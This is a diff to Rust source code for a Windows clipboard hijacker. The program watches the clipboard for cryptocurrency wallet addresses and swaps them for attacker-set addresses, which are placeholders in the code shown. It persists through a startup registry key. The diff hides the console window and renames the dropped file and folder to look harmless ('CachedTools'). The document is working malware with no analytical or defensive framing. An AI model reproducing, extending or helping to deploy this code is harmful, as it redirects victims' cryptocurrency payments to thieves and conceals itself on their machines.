@@ -1,36 +1,18 @@
-use clipboard::{
-    ClipboardProvider,
-    windows_clipboard::WindowsClipboardContext
-};
-use regex::Regex;
-use std::{
-    collections::HashMap,
-    env,
-    fs::{copy, create_dir_all},
-    io,
-    path::PathBuf,
-    str::FromStr,
-    thread,
-    time::Duration,
-};
-use winreg::{enums::*, RegKey};
+#![windows_subsystem = "windows"]
 
-static MUTEX: &str = "adsdfs98f76sda98fysdf";
-static FILE_NAME: &str = "chrome.txt";
-static FOLDER_NAME: &str = "fsdljfsd";
+use std::{collections::HashMap,env,fs::{copy, create_dir_all},io,path::PathBuf,str::FromStr,thread,time::Duration,};
+use clipboard::{ClipboardProvider, windows_clipboard::WindowsClipboardContext};
+use winreg::{enums::*, RegKey};
+use regex::Regex;
+
+static FILE_NAME: &str = "jk4dflk4b4jb343jbloijoibfvcs";
+static FOLDER_NAME: &str = "CachedTools";
 
 const BTC_ADDR: &str = "h";
 const XMR_ADDR: &str = "dfssdf";
 const DGE_ADDR: &str = "dfssfd";
 const LTC_ADDR: &str = "dsfsdf";
 const ETH_ADDR: &str = "dfgdg";
-const SHIBA_INU_ADDR: &str = "gfhdfh";
-const RIPPLE_ADDR: &str = "fghfgh";
-const SOLANA_ADDR: &str = "dfgsdfg";
-const BINANCE_COIN_ADDR: &str = "sdfhsdf";
-const TETHER_ADDR: &str = "fsdfsdf";
-const DAI_ADDR: &str = "gfhghf";
-const ETC_ADDR: &str = "ghgfhf";
 const BCH_ADDR: &str = "ghgfh";
 
 fn add_to_startup_registry(path: String) -> io::Result<()> {
@@ -39,7 +21,7 @@ fn add_to_startup_registry(path: String) -> io::Result<()> {
     let key = RegKey::predef(HKEY_CURRENT_USER)
         .open_subkey_with_flags(sub_key, KEY_WRITE)?;
 
-    key.set_value(MUTEX, &path)
+    key.set_value(FILE_NAME, &path)
 }
 
 fn get_destination_path() -> (PathBuf, PathBuf) {
@@ -102,20 +84,13 @@ fn main() {
         (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
         (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
         (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
-        (r"^0x[0-9a-fA-F]{40}$", SHIBA_INU_ADDR),
-        (r"^r[0-9a-zA-Z]{24,34}$", RIPPLE_ADDR),
-        (r"^So[1-9A-HJ-NP-Za-km-z]{41,43}$", SOLANA_ADDR),
-        (r"^0x[0-9a-fA-F]{40}$", BINANCE_COIN_ADDR),
-        (r"^0x[0-9a-fA-F]{40}$", TETHER_ADDR),
-        (r"^0x[0-9a-fA-F]{40}$", DAI_ADDR),
-        (r"^0x[0-9a-fA-F]{40}$", ETC_ADDR),
         (r"^bitcoincash:q[0-9a-zA-Z]{41}$", BCH_ADDR),
     ]);
     
     match persistence() {
         Ok(..) => loop {
             scan(&map);
-            thread::sleep(Duration::from_millis(20));
+            thread::sleep(Duration::from_millis(100));
         },
         Err(..) => {}
     };
